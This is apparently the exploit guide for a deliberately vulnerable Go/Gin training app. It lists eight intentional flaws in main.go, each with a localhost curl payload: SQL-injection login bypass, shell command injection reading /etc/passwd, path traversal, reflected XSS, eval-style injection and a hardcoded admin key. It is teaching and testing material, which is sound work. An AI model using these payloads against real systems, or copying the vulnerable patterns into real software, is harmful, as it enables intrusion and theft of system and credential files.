# go-gin-vuln – Vulnerability locations and exploit steps

This document describes where each intentional vulnerability lives in the `go-gin-vuln` project and how to reproduce the insecure behavior. **Do not deploy this app publicly.**

---

## 1. SQL Injection (CWE-89)

- **Location:** `go-gin-vuln/main.go` – SQL built via `fmt.Sprintf` with user input in:
  - `register()`: INSERT into users (username, password, email, role).
  - `login()`: SELECT with username, password in WHERE.
  - `getProfile()`: SELECT with id in WHERE.
  - `createProfile()`: INSERT into profiles (user_id, display_name, bio).
  - `updateProfile()`: UPDATE profiles with id, display_name, bio.
  - `search()`: SELECT with q in LIKE.
- **Example (auth bypass):**
  ```bash
  curl -X POST http://localhost:5005/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin\" OR \"1\"=\"1","password":"x"}'
  ```
- **Expected insecure behavior:** Authentication bypass or data leakage/modification.

---

## 2. Command Injection (CWE-78)

- **Location:** `go-gin-vuln/main.go`, function `runCmd()` – POST `/api/run`. User-controlled `cmd` passed to `exec.Command("sh", "-c", body.Cmd)`.
- **Example:**
  ```bash
  curl -X POST http://localhost:5005/api/run \
    -H "Content-Type: application/json" \
    -d '{"cmd":"id; cat /etc/passwd"}'
  ```
- **Expected insecure behavior:** Arbitrary shell commands executed.

---

## 3. Broken Access Control / IDOR (CWE-639)

- **Location:** `go-gin-vuln/main.go`, function `getProfile()` – GET `/api/profile/:id`. No ownership or role check.
- **Example:**
  ```bash
  curl http://localhost:5005/api/profile/1
  ```
- **Expected insecure behavior:** Any client can read any profile by ID.

---

## 4. Weak auth/session handling (CWE-287 / CWE-384)

- **Location:** `go-gin-vuln/main.go` – hardcoded secretKey, MD5 passwords, cookies not httpOnly; admin protected only by hardcoded API key.
- **Example:** Use SQLi in login to bypass; or reuse a captured cookie.
- **Expected insecure behavior:** Session hijack or auth bypass.

---

## 5. Hardcoded secret/credential (CWE-798)

- **Location:** `go-gin-vuln/main.go` top-level – `secretKey`, `adminAPIKey` constants.
- **Example:**
  ```bash
  curl -H "X-API-Key: go_gin_admin_key_xyz" http://localhost:5005/api/admin/users
  ```
- **Expected insecure behavior:** Admin impersonation if source is exposed.

---

## 6. Insecure file upload / path traversal (CWE-434 / CWE-22)

- **Upload:** `go-gin-vuln/main.go`, function `upload()` – POST `/api/upload`. Client filename used as-is; no type/size validation.
- **Path traversal:** `go-gin-vuln/main.go`, function `readFile()` – GET `/api/file?name=...`. `name` joined with uploadDir via `filepath.Join` without resolving or ensuring result stays under uploadDir.
- **Example (path traversal):**
  ```bash
  curl "http://localhost:5005/api/file?name=../../../etc/passwd"
  ```
- **Expected insecure behavior:** Read files outside uploads; upload of malicious files.

---

## 7. XSS (CWE-79)

- **Location:** `go-gin-vuln/main.go`, function `echo()` – GET `/api/echo?msg=...`. `msg` concatenated into HTML with no encoding.
- **Example:**
  ```bash
  curl "http://localhost:5005/api/echo?msg=<script>alert(1)</script>"
  ```
- **Expected insecure behavior:** Reflected XSS when viewed in a browser.

---

## 8. Unsafe deserialization / eval-like sink (CWE-502 / CWE-94)

- **Unsafe deserialization:** `go-gin-vuln/main.go`, function `configLoad()` – POST `/api/config/load`. Request body passed to `gob.NewDecoder(...).Decode(&v)`. Decoding untrusted gob can lead to type confusion or abuse.
- **Eval-like (command injection):** `go-gin-vuln/main.go`, function `doEval()` – POST `/api/eval`. User-supplied `expr` is interpolated into `exec.Command("sh", "-c", "echo $(( "+body.Expr+" ))")`, allowing shell command injection.
- **Example (doEval command injection):**
  ```bash
  curl -X POST http://localhost:5005/api/eval \
    -H "Content-Type: application/json" \
    -d '{"expr":"1)); id #"}'
  ```
- **Expected insecure behavior:** Remote code execution via command injection (runCmd or doEval); potential abuse via gob decode (configLoad).

---

**Summary:** All vulnerabilities are in `go-gin-vuln/main.go`. Use only in an isolated environment. Fixes: see the project's `SAFE_VARIANT.md`.
